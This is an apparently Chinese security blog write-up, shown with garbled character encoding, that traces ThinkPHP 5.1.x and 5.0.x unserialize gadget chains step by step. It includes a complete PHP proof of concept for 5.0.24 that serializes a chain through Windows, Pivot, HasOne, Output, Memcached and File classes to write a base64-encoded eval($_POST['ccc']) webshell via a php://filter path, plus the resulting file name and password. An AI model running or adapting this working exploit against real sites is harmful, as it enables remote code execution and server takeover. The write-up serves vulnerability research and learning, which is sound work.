ä»€ä¹ˆä¸å¯æ§åº”è¯¥æ€ä¹ˆåˆ¤æ–­å‘¢ \n\nå¯ä»¥ç›´æ¥çœ‹ç±»å±æ€§ ç±»ä¸­æ˜ç¡®å®šä¹‰äº†æŸä¸ªå±æ€§ é‚£ä¹ˆè¿™ä¸ªå±æ€§æˆ‘ä»¬å°±å¯ä»¥é‡å†™æ¥æ§åˆ¶\n\nè€Œparamå‡½æ•°å¯ä»¥è·å¾—`$_GET`æ•°ç»„ å¹¶ä¸”èµ‹å€¼ç»™`$this->param`\n\n```\n$this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782687578-16bc813b-9534-49c7-b37d-444a01d9a9b7.png)\n\nè·Ÿè¿›input\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781256320-141b25c8-120a-469c-90e9-86989d2047f6.png)\n\nè·Ÿè¿›getData\n\n```plain\nprotected function getData(array $data, $name)\n    {\n        foreach (explode('.', $name) as $val) {\n            if (isset($data[$val])) {\n                $data = $data[$val];\n            } else {\n                return;\n            }\n        }\n\n        return $data;\n    }\n$data=$data[$val]=$data[$name]\n```\n\nä»GETæ•°ç»„ä¸­è·å–é”®åä¸ºZ1d10tçš„é”®å€¼\n\nå¹¶ä¸”è¿”å›å€¼å°±æ˜¯æˆ‘ä»¬çš„å‘½ä»¤ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781443982-69813e68-019a-4b4b-bdea-6c6cd5eea7df.png)\n\næ¥ç€è¿›å…¥getFilterå‡½æ•°è·å–filterå±æ€§\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781754618-b96d3cc0-7e9d-486f-a068-2c522e2813db.png)\n\nåœ¨paramå‡½æ•°ä¸­filteré¦–å…ˆä¸ºç©º ç„¶ååœ¨è¿™é‡Œç”¨`$this->filter`èµ‹å€¼ å› æ­¤æˆ‘ä»¬å¯ä»¥å†pocä¸­é‡æ–°èµ‹å€¼ä¸ºsystem\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781901324-7242fa00-4545-438d-b596-4fafb50146c4.png)\n\nç„¶ååœ¨$filteræ•°ç»„è¿½åŠ ä¸€ä¸ªdefault å€¼ä¸ºnull æ²¡å¤§ç”¨ ç„¶åè¿”å›\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781993001-c21d178c-8095-49ed-a55a-173e719c21a3.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782003574-6cab6507-0e00-4ccd-8d28-7990359fb177.png)\n\næœ€åè¿›å…¥filterValueå‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782079134-841663cb-5743-4e13-82ea-e6a79e5ab3c4.png)\n\nç”¨array_popå¼¹å‡ºæ•°ç»„æœ«å°¾çš„å…ƒç´  å› æ­¤åªå‰©ä¸‹äº†system\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782149417-fcbf6955-1c8c-488f-ab51-5f4a9dcab3b0.png)\n\nç„¶åå†è°ƒç”¨call_user_funcæ–¹æ³• å®ŒæˆRCE\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782415565-2b48611f-8f94-40e3-81dc-ec156a1dcb46.png)\n\nok è®©æˆ‘ä»¬å†æ¥æ¢³ç†ä¸€ä¸‹æ€è·¯ \n\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä»ä¸¤ä¸ªæ–¹å‘æ­£å‘ä¸åå‘å»åˆ†ææ¯”è¾ƒæ¸…æ™° \n\næ­£å‘ï¼š\n\n```plain\n\\thinkphp\\library\\think\\process\\pipes\\Windows.php - > __destruct()\n\\thinkphp\\library\\think\\process\\pipes\\Windows.php - > removeFiles()\nWindows.php:file_exists() ç”±äºä¼ å…¥äº†new Pivot() å°†å¯¹è±¡å½“ä½œäº†å­—ç¬¦ä¸²å¤„ç† è§¦å‘__toString\nç”±äºPivotç±»æ²¡æœ‰__toString ä½†æ˜¯ä»–ç»§æ‰¿äº†Modelç±» ä½†æ˜¯è¯¥ç±»ä¹Ÿä¸å­˜åœ¨ ç„¶è€Œå®ƒå¤ç”¨äº†Conversionç±» å¯ä»¥ç”¨å®ƒçš„toString\nå› æ­¤åˆ°äº†Conversionç±»\nthinkphp\\library\\think\\model\\concern\\Conversion.php - > __toString()\n__toStringä¸­åˆè°ƒç”¨äº†toJon\nthinkphp\\library\\think\\model\\concern\\Conversion.php - > toJson() \ntojson()ä¸­åˆè°ƒç”¨äº†toarray()\ntoarrayä¸­å­˜åœ¨è°ƒç”¨visible()è¿™ä¸ªå‡½æ•° æ­¤æ—¶æ€è·¯ä¸ºå¦‚æœè°ƒç”¨æŸä¸ªå¯¹è±¡ä¸å­˜åœ¨çš„å‡½æ•° é‚£ä¹ˆä¼šè§¦å‘__call()\nå¹¶ä¸”Conversionç±»ä¸­$this->dataç±»å±æ€§æˆ‘ä»¬å¯æ§ getAttr()ä¼šè·å–é”®ä¸ºZ1d10tçš„å€¼ æˆ‘ä»¬ç»™ä»–èµ‹å€¼ä¸€ä¸ªå¯¹è±¡Request\nå› æ­¤åˆ°äº†Requestç±»\nthinkphp\\library\\think\\Request.php   - > __call()\nè¯¥callå‡½æ•°ä¸­æœ‰call_user_func_arrayæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤ä½†æ˜¯ ç”±äºarary_unshiftå‡½æ•°æˆ‘ä»¬çš„å‚æ•°ç¬¬ä¸€ä¸ªä¸ºä¸€ä¸ªå¯¹è±¡å› æ­¤æ²¡æ³•æ„‰å¿«çš„æ‰§è¡Œå‡½æ•°\næ­¤æ—¶æ­£å‘å°±å…ˆæ–­å¼€äº†\n```\n\nåå‘\n\n```plain\nå‰é¢ç”±äºå‚æ•°ä¸ç†æƒ³ æˆ‘ä»¬æ²¡æ³•æ„‰å¿«çš„æ‰§è¡Œå‡½æ•° å› æ­¤æˆ‘ä»¬åªå¥½å¯»æ‰¾å…¶ä»–æ–¹æ³•\né‚£ä¹ˆå­˜åœ¨filterValueè¿™ä¸ªè¿‡æ»¤å™¨å‡½æ•° è¯¥å‡½æ•°ç›´æ¥å­˜åœ¨call_user_func($filter,$value)\nåœ¨è¿™é‡Œæˆ‘ä»¬$filteræ˜¯ç›´æ¥å¯æ§çš„ ä½†æ˜¯å‘¢ $valueæ˜¯ä¸å¯ç›´æ¥æ§åˆ¶çš„ å› æ­¤é€šè¿‡é“¾å¼è°ƒç”¨å»çœ‹çœ‹å“ªä¸ªå‡½æ•°å¯ä»¥æ§åˆ¶è¯¥$value\næœ€åæ‰¾åˆ°inputå‡½æ•°ä¸­è°ƒç”¨äº†filterValue()\nthinkphp\\library\\think\\Request.php - > input()  $dataç”±param()çš„$paramæ§åˆ¶ $nameç”±param()çš„nameæ§åˆ¶\nthinkphp\\library\\think\\Request.php - > param()  $paramé€šè¿‡getæ–¹å¼ä¼ å‚å¯æ§ $nameå¯æ§ç”±isAjax()å¯æ§\nthinkphp\\library\\think\\Request.php - > isAjax() å®ƒä¼ ç»™param()çš„$this->config['var_ajax']æ˜¯å¯æ§çš„ ä½¿å¾—param() $nameå¯æ§\né‚£ä¹ˆä¾æ¬¡æ˜¯æ‰¾åˆ°äº†isAjax()->param()->input()->filterValue() ï¼ˆä»¥ä¸Šè¿‡ç¨‹å€’ç€çœ‹ï¼‰\nä¾æ¬¡æ‰§è¡Œå‡½æ•°éœ€è¦çš„$valueå¯æ§äº† åªéœ€è¦ç”¨æ­£å‘æœ€åæ‹¿åˆ°çš„call_user_func_array()å°†isAjax()ä¸²èµ·æ¥ \né‚£ä¹ˆæ•´æ¡é“¾å­å°±é€šäº†\nthinkphp\\library\\think\\Request.php - > filterValue()\n```\n\nå·åŒ…æµ†çš„å›¾ è¿™ä¸ªå›¾æ€è·¯å¤ªæ¸…æ™°äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png)\n\n## ä¿®å¤\n\nç›´æ¥æŠŠ__call()æ–¹æ³•ç äº† åé¢çš„é“¾å­ä¹Ÿå°±æ–­æ‰äº†\n\n# 5.2.xç‰ˆæœ¬åˆ†æ\n\nè¿™é‡Œå®˜æ–¹å·²ç»æŠŠThinkphp5.2.xå‡çº§ä¸ºThinkphp6.0å› æ­¤æ²¡æ³•ä¸‹è½½5.2.xçš„æºç åŒ… \n\nå¯„ ç½‘ä¸Šæ‰¾ä¸åˆ°ç›¸å…³æºç åŒ…\n\nä¹‹ååœ¨6.xåˆ†æå†å›é¡¾å§\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701853032417-15c295a4-6a2d-4321-9e45-802d2c775af2.png)\n\nå¯ä»¥çœ‹è¿™ä½å¸ˆå‚…çš„[thinkphp5.1.x~5.2.xç‰ˆæœ¬ååºåˆ—åŒ–é“¾æŒ–æ˜åˆ†æ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/6619#toc-1)\n\n\n\n# 5.0.xç‰ˆæœ¬åˆ†æ\n\n## ç¯å¢ƒæ­å»º\n\n- php5.0.24+Xdebug+thinkphp5.0.24+phpstudy+phpstorm \n\nå’Œä¸Šé¢ä¸€æ ·å‡†å¤‡ä¸€ä¸ªäºŒæ¬¡ååºåˆ—åŒ–å…¥å£ æ›¿æ¢`/application/index/controller/index.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701854704626-44a5de6b-09a6-4e37-ad44-b82ebe834d82.png)\n\npocï¼šï¼ˆå½±å“ç‰ˆæœ¬5.0.24å’Œ5.0.18ï¼Œ5.0.9ä¸å¯ç”¨ï¼‰\n\n```plain\n<?php\n\n//__destruct\nnamespace think\\process\\pipes{\n    class Windows{\n        private $files=[];\n\n        public function __construct($pivot)\n        {\n            $this->files[]=$pivot; //ä¼ å…¥Pivotç±»\n        }\n    }\n}\n\n//__toString Modelå­ç±»\nnamespace think\\model{\n    class Pivot{\n        protected $parent;\n        protected $append = [];\n        protected $error;\n\n        public function __construct($output,$hasone)\n        {\n            $this->parent=$output; //$this->parentç­‰äºOutputç±»\n            $this->append=['a'=>'getError'];\n            $this->error=$hasone;   //$modelRelation=$this->error\n        }\n    }\n}\n\n//getModel\nnamespace think\\db{\n    class Query\n    {\n        protected $model;\n\n        public function __construct($output)\n        {\n            $this->model=$output; //get_class($modelRelation->getModel()) == get_class($this->parent)\n        }\n    }\n}\n\nnamespace think\\console{\n    class Output\n    {\n        private $handle = null;\n        protected $styles;\n        public function __construct($memcached)\n        {\n            $this->handle=$memcached;\n            $this->styles=['getAttr'];\n        }\n    }\n}\n\n//Relation\nnamespace think\\model\\relation{\n    class HasOne{\n        protected $query;\n        protected $selfRelation;\n        protected $bindAttr = [];\n\n        public function __construct($query)\n        {\n            $this->query=$query; //è°ƒç”¨Queryç±»çš„getModel\n\n            $this->selfRelation=false; //æ»¡è¶³æ¡ä»¶!$modelRelation->isSelfRelation()\n            $this->bindAttr=['a'=>'admin'];  //æ§åˆ¶__callçš„å‚æ•°$attr\n        }\n    }\n}\n\nnamespace think\\session\\driver{\n    class Memcached{\n        protected $handler = null;\n\n        public function __construct($file)\n        {\n            $this->handler=$file; //$this->handlerç­‰äºFileç±»\n        }\n    }\n}\n\nnamespace think\\cache\\driver{\n    class File{\n        protected $options = [\n            'path'=> 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',\n            'cache_subdir'=>false,\n            'prefix'=>'',\n            'data_compress'=>false\n        ];\n        protected $tag=true;\n\n\n    }\n}\n\nnamespace {\n    $file=new think\\cache\\driver\\File();\n    $memcached=new think\\session\\driver\\Memcached($file);\n    $output=new think\\console\\Output($memcached);\n    $query=new think\\db\\Query($output);\n    $hasone=new think\\model\\relation\\HasOne($query);\n    $pivot=new think\\model\\Pivot($output,$hasone);\n    $windows=new think\\process\\pipes\\Windows($pivot);\n\n    echo base64_encode(serialize($windows));\n}\n```\n\nå°†ç”Ÿæˆçš„payload åœ¨é¦–å…ˆç»™inputä¼ å‚ ï¼ˆåŸè°…è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯thinkphp5.1 åªè¦\\thinkphp\\base.phpæ˜¾ç¤ºç‰ˆæœ¬æ˜¯æ­£ç¡®çš„å³å¯ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855243164-639a1a3d-c7c6-4530-9997-781cc8000fa9.png)\n\nç„¶åè®¿é—®`/public/a.php3b58a9545013e88c7186db11bb158c44.php`\n\nå¯†ç ä¸ºccc å¯è§æ˜¯å¯ä»¥æ‰“é€šçš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855194658-fff84791-d39a-4d12-a5a0-314b74e7a472.png)\n\nå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å†™é©¬ä¸Šå»çš„æ–‡ä»¶å†…å®¹ å¯è§ä¸æ˜¯æ­£å¸¸çš„ä¸€å¥è¯ é‡Œé¢å…¶å®è¿˜åŒ…æ‹¬äº†filterchainçš„çŸ¥è¯†ç‚¹\n\nä¸€å¥è¯ç†è§£å°±æ˜¯åˆ©ç”¨base64ã€iconvç­‰ç¼–ç ç»„åˆæ„é€ å‡ºç‰¹å®šçš„phpä»£ç è¿›è€Œå®Œæˆæ— éœ€ä¸´æ—¶æ–‡ä»¶çš„RCE å¹¶ä¸”å¯ä»¥ç»•è¿‡æ­»äº¡å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855894718-11638ac7-dace-4401-a191-35e6dd8bd4e3.png)\n\n## æŒ–æ˜\n\né¦–å…ˆæˆ‘ä»¬çš„å…¥å£ç‚¹è¿˜æ˜¯Windows.phpçš„ææ„å‡½æ•° å‰é¢ä¸€éƒ¨åˆ†çš„é“¾å­å’Œ5.1.xçš„å·®ä¸å¤š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375636049-c3987dc4-2055-40d9-afb2-e19ef408cc37.png)\n\nç»§ç»­è·Ÿè¿› åˆ°äº†removeFiles() è¿™é‡Œè¿˜æ˜¯ä¸€æ ·ç”±äºç›´æ¥æŠŠå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²ä¼ å…¥file_existså‡½æ•° å› æ­¤å¯¼è‡´ä¼šè§¦å‘`__toString()` \n\nä½†æ˜¯å’Œ5.1.xçš„é“¾å­ä¸åŒçš„æ˜¯5.0.xçš„modelç±»æœ‰`__toSting()` å› æ­¤ä¸éœ€è¦use 5.1.xçš„è¢«traitä¿®é¥°çš„Converisonç±»ç”¨å®ƒçš„`__toString()`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375828839-82070bc9-5c06-4c40-b71a-835552d0f7de.png)\n\nç»§ç»­è·Ÿè¿› åˆ°toJson()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375862497-c655956d-eb3c-4409-99d4-7eb0b9ea9892.png)\n\nç„¶åè¿›åˆ°äº†toArray()å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376002618-a6d2f155-ae7a-4b05-8ba7-71a97e257ebb.png)\n\nè¿™é‡Œæœ‰å››ä¸ªæ–­ç‚¹æˆ‘ä»¬éœ€è¦ç€é‡åˆ†æ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376154221-3e88dbd1-be05-4e8a-8552-5d5d9e3d7c5e.png)\n\né¦–å…ˆè¿™é‡Œ`$relation`æ˜¯é€šè¿‡`parseName`æ–¹æ³•å®Œæˆçš„ é¡ºä¾¿æä¸€å˜´ è¿™é‡Œè°ƒç”¨æ–¹æ³•æ–¹å¼æ˜¯é€šè¿‡é™æ€æ–¹æ³•è°ƒç”¨çš„\n\né‚£è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“`$name `çš„å€¼æ˜¯é€šè¿‡éå†`$this->append`æ•°ç»„èµ‹å€¼çš„ä¸ºgetError\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376915350-5f097820-b5a3-413a-b85f-157888ed6d97.png)\n\né‚£è¿™é‡Œæœ‰ä¸ªç–‘æƒ‘å°±æ˜¯æˆ‘ä»¬pocä¸­æ˜¯ç»™Pivotç±»çš„`$this->append`èµ‹å€¼çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376975289-22b19a10-94c9-4d5a-b5b1-6fb5d6524397.png)\n\nä¸ºä»€ä¹ˆè¿™é‡ŒModelç›´æ¥ç”¨å‘¢ å› ä¸ºModelæ˜¯Pivotçš„çˆ¶ç±» å› æ­¤çˆ¶ç±»å¯ä»¥ç›´æ¥è°ƒç”¨å­ç±»çš„protectedä¿®é¥°çš„å±æ€§\n\nok æˆ‘ä»¬ç»§ç»­è·Ÿè¿›åˆ†æä¸€ä¸‹\n\nè¿™é‡Œ`type=1`è¿›å…¥ifè¯­å¥ ç›´æ¥è¿”å›getError\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377084411-7ec81a05-3bb0-49b6-acb3-8fd7b9c99bd6.png)\n\næ­¤æ—¶$relationä¸ºgetError ç»§ç»­åˆ° `method_exists`å‡½æ•° \n\nModelè¿™ä¸ªç±»æ˜¯æœ‰getErrorå‡½æ•°çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377185911-2e85ad88-f1ec-4ea5-8aa1-54a915edc50d.png)\n\nå› æ­¤ä¼šè¿›å…¥ è¿™é‡Œçš„errorå¯æ§ å¹¶ä¸”æˆ‘ä»¬è®¾ç½®ä¸ºäº†HasOneå¯¹è±¡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377378463-a7d85d0c-8de6-43d0-b817-a926d5b334ee.png)\n\nåŒæ ·pocä¸­ä¹Ÿæ˜¯å¯ä»¥ä½“ç°å‡ºæ¥çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383452619-335e2d8b-8178-46ec-87e6-bf8d4f2f2b1d.png)\n\nç¬¬ä¸€ä¸ªæ–­ç‚¹è‡³æ­¤å…ˆè¯´åˆ°è¿™é‡Œ æˆ‘ä»¬ç»§ç»­è·Ÿè¿›ç¬¬äºŒä¸ªæ–­ç‚¹\n\næ˜¯å¯¹`$value`è¿›è¡Œèµ‹å€¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383592936-3f2e8136-b869-4562-ac0c-0e816bcffd14.png)\n\nè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆé•¿çš„ifæ¡ä»¶è¯­å¥çš„åˆ¤æ–­\n\n```\nif ($this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent))\n```\n\næˆ‘ä»¬ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†æ¥çœ‹\n\næ¡ä»¶ä¸€ï¼š\n\nä¹‹å‰æˆ‘ä»¬5.1ç‰ˆæœ¬çš„æ—¶å€™åœ¨`__toSring`è¿™ä¸€éƒ¨åˆ†çš„æ—¶å€™æ˜¯è§¦å‘äº†__callæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™çš„ç›®æ ‡ä¹Ÿæ˜¯å»å¯»æ‰¾åˆé€‚çš„callæ–¹æ³•ï¼Œé‚£ä¹ˆæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†`think\\console\\Output`æˆ‘ä»¬åº”è¯¥è®©è¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªoutputå¯¹è±¡ è¿™æ ·ç­‰æˆ‘ä»¬å‡ºå»ä¹‹å æ‰§è¡Œ`$value->getAttr($attr)`å°±ä¼šè§¦å‘`__call()`ï¼›é¢ï¼Œå› æ­¤è¿™é‡Œvalueçš„å€¼ä¸º`$this-parent`ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦èµ‹å€¼ä¸ºä¸€ä¸ªoutputå¯¹è±¡\n\næ¡ä»¶äºŒï¼š\n\n$modelRelationæˆ‘ä»¬å·²ç»å¯¹å®ƒèµ‹å€¼äº†HasOneå¯¹è±¡äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384075250-485d27df-567b-42e4-909f-c9373ac7cc21.png)\n\næˆ‘ä»¬è·Ÿè¿›`isSelfRelation()`æ–¹æ³• å®ƒæ˜¯Relationç±»çš„ä¸€ä¸ªæ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384182743-0270df5d-fc44-408e-9f9a-6def2b02dbb4.png)\n\nè€ŒOneToOneæ˜¯å®ƒçš„å­ç±» ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384248249-c1f53c2f-f63c-4258-a3c5-9e277eace62c.png)\n\nHasOneæ˜¯OneToOneçš„ä¸€ä¸ªå­ç±»![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384300728-5a488be0-ad20-48a0-a430-fc24575a168b.png)\n\nå› æ­¤æˆ‘ä»¬æ§åˆ¶`HasOne->selfRelation`ä¸ºfalseå³å¯\n\næ¡ä»¶ä¸‰ï¼š`get_class($modelRelation->getModel()) == get_class($this->parent)`\n\nä¹‹å‰æˆ‘ä»¬è¯´åˆ°è®©`$this->parent`ä¸ºä¸€ä¸ªOutputå¯¹è±¡å³å¯ å› æ­¤è¿™é‡Œæ¡ä»¶æˆç«‹çš„å°±æ˜¯è®©`$modelRelation->getModel()`è¿”å›ä¸€ä¸ªoutputå¯¹è±¡\n\næˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªå‡½æ•°è§‚å¯Ÿä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384583595-25a71b36-479a-4fa7-9850-231cb4feb500.png)\n\né‚£ä¹ˆæ€è·¯å°±æ˜¯çœ‹çœ‹å“ªä¸ªç±»ä½¿ç”¨äº†åŒågetModelå‡½æ•° å¹¶ä¸”æ–¹æ³•æˆ‘ä»¬å¯æ§\n\né‚£ä¹ˆæœ€åæ‰¾åˆ°æ˜¯Queryç±»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384728365-53145e1f-2749-4e58-b5f2-7ad47555d27e.png)\n\nå› æ­¤æˆ‘ä»¬è¿™é‡Œåªéœ€è¦`$this->query`ä¸ºQueryçš„ä¸€ä¸ªå¯¹è±¡å³å¯ \n\né‚£ä¹ˆä¸‰ä¸ªæ¡ä»¶å‡æ»¡è¶³ ç„¶å`$value = $this->parent`æˆ‘ä»¬å°±å‡ºæ¥äº†\n\næ¥ç€è¿›å…¥ç¬¬ä¸‰ä¸ªæ–­ç‚¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384867170-96542676-a086-45fc-a7c7-78f0cbc455e0.png)\n\nè¿™é‡Œ`$modelRelation`æ˜¯HasOneå¯¹è±¡ è°ƒç”¨å®ƒçš„getBindAttræ–¹æ³• å…¶å®å®ƒæ²¡æœ‰ è°ƒç”¨çš„æ˜¯å®ƒçš„çˆ¶ç±»OneToOneçš„æ–¹æ³•\n\nè¿”å›ä¸€ä¸ªæ•°ç»„`[\"a\"=>\"admin\"]`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385130534-ca593a2e-d4ec-4b2a-8262-b6f7d678259c.png)\n\nå‡ºæ¥ä¹‹å æˆ‘ä»¬å¯¹bindAttræ•°ç»„åšäº†éå† å–å‡ºäº†adminå€¼ å¹¶ä¸”èµ‹å€¼ç»™`$attr` å‡†å¤‡è¿›å…¥__callæ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385270965-3c8c5977-cfd1-4096-8fe1-d43c5971ce20.png)\n\nvalueä¸ºOutputå¯¹è±¡ atträ¸ºadmin\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385400098-cb29f0b7-7658-41ce-971d-6192d5f6fed5.png)\n\n\n\nç»§ç»­è·Ÿè¿›\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385455272-facd2168-2893-44ce-818c-5addd49162ca.png)\n\nç”¨array_unshiftå‡½æ•°å°†æ–¹æ³•åä¹Ÿå°±æ˜¯getAttråŠ åˆ°å‚æ•°æ•°ç»„ä¸­ æœ€åä¸º`[\"getAttr\",\"admin\"]`\n\nç„¶åç”¨`call_user_func_array()`è°ƒç”¨è‡ªå·±çš„blockæ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385660127-4ad92565-a9da-4a18-b38e-213780816b13.png)\n\nè·Ÿè¿›è¯¥æ–¹æ³• è°ƒç”¨äº†writelnæ–¹æ³• å¹¶ä¸”å€¼ä¸ºæˆ‘ä»¬å½“ä½œå‚æ•°ä¼ å…¥çš„æ•°ç»„å†…å®¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385812207-c646114f-7e0f-4319-9968-573f7108e987.png)\n\nç»§ç»­è·Ÿè¿›writeln åˆè°ƒç”¨äº†writeæ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385868106-38a09ecb-7388-41df-a310-a79fb86b0fd0.png)\n\né‚£ä¹ˆæˆ‘ä»¬å…¨å±€æœç´¢çœ‹çœ‹è°è°ƒç”¨äº†writeå‡½æ•° åœ¨Memcachedç±»æ‰¾åˆ°äº†åˆé€‚çš„writeæ–¹æ³•\n\nå› æ­¤è®©Outputç±»ä¸­`$this->handler`ä¸ºMemecachedå¯¹è±¡å³å¯ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386253172-ce3e25a5-224c-4c7f-af89-35174a14bc81.png)\n\nè¿™é‡Œåˆè°ƒç”¨äº†setæ–¹æ³• æˆ‘ä»¬ç»§ç»­setæ–¹æ³•\n\næœ€åå‘ç°Fileç±»ä¸­è°ƒç”¨äº†setæ–¹æ³• æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®©Memcacheç±»ä¸­çš„`$this->handler`ä¸ºFileå¯¹è±¡å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386333208-33809789-92e0-4574-a19d-1f4c14c2760c.png)\n\nç»§ç»­å‘ä¸‹èµ° æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ç›´æ¥å†™phpğŸçš„è¯­å¥ ä½†æ˜¯æœ‰æ­»äº¡exit()æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¼–è§£ç ç»•è¿‡ `php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php`\n\nè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°äº† å‚è€ƒï¼šhttps://www.cnblogs.com/meng-han/p/16849600.html\n\nç„¶åè¿˜æœ‰`file_put_contents()` å±é™©å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386596117-accfef1b-456e-4185-af8b-d5cd89c25aa6.png)\n\n`$filename`é€šè¿‡`getCacheKey`å‡½æ•°è·å¾—çš„ æˆ‘ä»¬è·Ÿè¿›\n\nè¿™é‡Œçš„nameä¸ºæˆ‘ä»¬ä¹‹å‰å‚æ•°æ•°ç»„ä¸­ä¸¤ä¸ªå€¼getAttrå’Œadminæ‹¼æ¥çš„ ç„¶åè®¡ç®—å…¶md5å€¼èµ‹å€¼ä¸º`$name`\n\nä¸º`63ac11a7699c5c57d85009296440d77a`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387227854-b8616d60-99b4-4d13-928f-2bbaed760a6a.png)\n\næ¥ç€åˆ°`$this->options['path']` è¿™é‡Œæˆ‘ä»¬æ˜¯å¯æ§çš„ ä¹Ÿå°±æ˜¯æ–‡ä»¶åæˆ‘ä»¬å¯æ§ è®¾ç½®ä¸ºæˆ‘ä»¬çš„ç‰¹æ®Šç¼–è§£ç paylaod\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387307842-5b351ecc-b1bb-49be-800b-f6629a6202ab.png)\n\næ–‡ä»¶æœ€ç»ˆåä¸º`$name` ä¹Ÿå°±æ˜¯ä¹‹å‰è®¡ç®—çš„md5å€¼ å†åŠ ä¸Š`$this->options['path']`ä¸¤éƒ¨åˆ†æ„æˆçš„\n\nä¸º`php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php`\n\nè™½ç„¶æ­¤æ—¶æˆ‘ä»¬æ–‡ä»¶åå¯æ§äº†ä½†æ˜¯`$value`ä¸ºtrue 